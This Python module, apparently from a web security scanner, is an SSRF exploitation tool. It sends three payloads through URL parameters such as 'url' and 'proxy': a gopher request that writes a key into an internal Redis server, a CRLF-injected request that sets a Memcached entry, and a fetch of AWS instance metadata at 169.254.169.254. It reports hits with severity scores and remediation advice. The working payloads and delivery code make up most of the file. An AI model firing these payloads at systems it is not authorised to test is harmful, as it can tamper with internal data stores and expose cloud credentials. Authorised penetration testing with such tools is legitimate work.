#!/usr/bin/env python3
"""
SSRF Chain Exploiter — Senior Level
---------------------------------------
Attempts to exploit an identified SSRF vulnerability to interact
with internal services like Redis, Memcached, or cloud metadata.
"""

import requests
from typing import List, Dict, Optional
from rich.console import Console

try:
    from modules.core.base_scanner import BaseScanner
except ImportError:
    BaseScanner = object

console = Console()


class SSRFChainScanner(BaseScanner if BaseScanner is not object else object):
    def __init__(self, target: str, session=None, timeout: int = 10):
        if BaseScanner is not object:
            super().__init__(target, session, timeout)
        else:
            self.target = target.rstrip("/")
            self.timeout = timeout
            self.session = session or requests.Session()
            self.session.verify = False
            self.results = []
        self.params = ["url", "dest", "uri", "path", "proxy"]

    def _test_internal_service(self, base_url: str, param: str) -> List[Dict]:
        findings = []

        # We attempt to hit a local Redis server (port 6379) using gopher or http
        payloads = [
            # Gopher payload to set a key in Redis
            (
                "Redis (Gopher)",
                "gopher://127.0.0.1:6379/_SET%20webpwn%20pwned%0AQUIT%0A",
            ),
            # HTTP payload for Memcached
            (
                "Memcached (HTTP)",
                "http://127.0.0.1:11211/%0d%0aset%20webpwn%200%20900%205%0d%0apwned%0d%0aquit%0d%0a",
            ),
            # Cloud Metadata
            ("AWS Metadata", "http://169.254.169.254/latest/meta-data/"),
        ]

        for name, payload in payloads:
            if hasattr(self, "_get"):
                r = self._get(base_url, params={param: payload})
            else:
                try:
                    r = self.session.get(
                        base_url,
                        params={param: payload},
                        timeout=self.timeout,
                        verify=False,
                    )
                except Exception:
                    r = None

            if r:
                # AWS metadata signature
                if name == "AWS Metadata" and (
                    "ami-id" in r.text or "instance-id" in r.text
                ):
                    findings.append(
                        {
                            "url": base_url,
                            "type": "SSRF to AWS Metadata",
                            "severity": "critical",
                            "cvss": 9.8,
                            "parameter": param,
                            "payload": payload,
                            "detail": "SSRF vulnerability used to retrieve AWS instance metadata.",
                            "evidence": "Found 'ami-id' in response.",
                            "owasp": "A10:2021 – Server-Side Request Forgery",
                            "remediation": "Restrict server outbound requests. Use IMDSv2 for AWS.",
                        }
                    )
                # If we get a 200 OK and it didn't just reflect the request
                elif (
                    r.status_code == 200 and len(r.text) > 0 and name != "AWS Metadata"
                ):
                    # This is harder to verify blindly without seeing the Redis state,
                    # but if it didn't crash and returned 200, it's highly suspicious.
                    # We log it as a potential finding for manual review.
                    if "STORED" in r.text or "+OK" in r.text:
                        findings.append(
                            {
                                "url": base_url,
                                "type": f"SSRF to Internal {name}",
                                "severity": "critical",
                                "cvss": 9.8,
                                "parameter": param,
                                "payload": payload,
                                "detail": f"SSRF vulnerability successfully interacted with internal {name} service.",
                                "evidence": f"Response indicated success: {r.text[:50]}",
                                "owasp": "A10:2021 – Server-Side Request Forgery",
                                "remediation": "Restrict server outbound requests to local services and loopback address.",
                            }
                        )

        return findings

    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ SSRF Chain Exploiter on {self.target}[/bold yellow]"
        )
        for param in self.params:
            res = self._test_internal_service(self.target, param)
            for r in res:
                if r not in self.results:
                    self.results.append(r)
                    console.print(f"  [bold red][!] {r['type']}[/bold red]")

        color = "red" if self.results else "green"
        console.print(f"  [{color}]{len(self.results)} SSRF Chain issue(s) found[/]")
        return self.results
